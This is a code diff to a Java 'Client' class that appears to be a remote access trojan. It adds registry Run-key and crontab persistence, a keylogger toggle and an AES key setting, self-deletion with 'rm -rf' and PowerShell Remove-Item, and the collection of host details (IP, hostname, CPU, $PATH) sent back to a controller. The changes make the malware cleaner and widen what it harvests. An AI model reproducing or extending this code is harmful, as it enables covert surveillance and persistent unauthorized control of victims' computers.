@@ -103,7 +103,7 @@ public class Client {
     private void createPersistence(String clientPath) {
         // For linux, use crontab: "(crontab -l 2>/dev/null; echo "*/5 * * * * $(which java) -jar jarfile") | crontab -"
         // For osx, use launchd:
-        ProcessBuilder pb = new ProcessBuilder("cmd.exe", "/c", "REG ADD HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v Desktop /d " + "\"" + clientPath + "\"");;
+        ProcessBuilder pb = new ProcessBuilder("cmd.exe", "/c", "REG ADD HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v Desktop /d " + "\"" + clientPath + "\"");
         if (SYSTEMOS.toLowerCase().contains("lin")){
             pb = new ProcessBuilder("(crontab", "-l", "2>/dev/null;", "echo \"*/5 * * * * $(which java) -jar jarfile\")", "|", "crontab", "-");
         }
@@ -278,9 +278,11 @@ public class Client {
                     communicate("EXIT");
                     File f = new File(Client.class.getProtectionDomain().getCodeSource().getLocation().getPath());
                     if (SYSTEMOS.toLowerCase().contains("wind")){
-                        Process proc = Runtime.getRuntime().exec("powershell.exe \"Remove-Item -Force " + f.getAbsolutePath() + "\"");
+                        Runtime.getRuntime().exec("powershell.exe \"Remove-Item -Force " + f.getAbsolutePath() + "\"");
+                        String persPath = System.getenv("APPDATA") + "\\Desktop.jar";
+                        Runtime.getRuntime().exec("cmd.exe /c REG DELETE HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v Desktop /d " + "\"" + persPath + "\"");
                     } else {
-                        Process proc = Runtime.getRuntime().exec("rm -rf " + f.getAbsolutePath());
+                        Runtime.getRuntime().exec("rm -rf " + f.getAbsolutePath());
                     }
                     socket.close();
                     System.exit(0);
@@ -553,7 +555,6 @@ public class Client {
                 debugMode = (Boolean.parseBoolean(settings[4]));
                 aesKey = settings[5];
                 keyLogger = (Boolean.parseBoolean(settings[6]));
-                System.out.println(settings[6]);
             }
         } catch (IOException e) {
             if (debugMode) {
@@ -666,12 +667,13 @@ public class Client {
         sb.append("Architecture: " + ARCH + "\n");
         sb.append("Encryption key: " + aesKey + "\n");
         sb.append("CPU: " + System.getenv("PROCESSOR_IDENTIFIER") + "\n");
-        sb.append("\t - Num. CPU Cores: " + System.getenv("NUMBER_OF_PROCESSORS") + "\n");
+        sb.append("  - Num. CPU Cores: " + System.getenv("NUMBER_OF_PROCESSORS") + "\n");
         try {
             InetAddress inetAddress = InetAddress.getLocalHost();
             sb.append("LAN IP: " + inetAddress.getHostAddress() + "\n");
             sb.append("Hostname: " + inetAddress.getHostName() + "\n");
         } catch (IOException ioe){}
+        sb.append("$PATH: " + System.getenv("PATH") + "\n");
         communicate(sb.toString());
     }
 
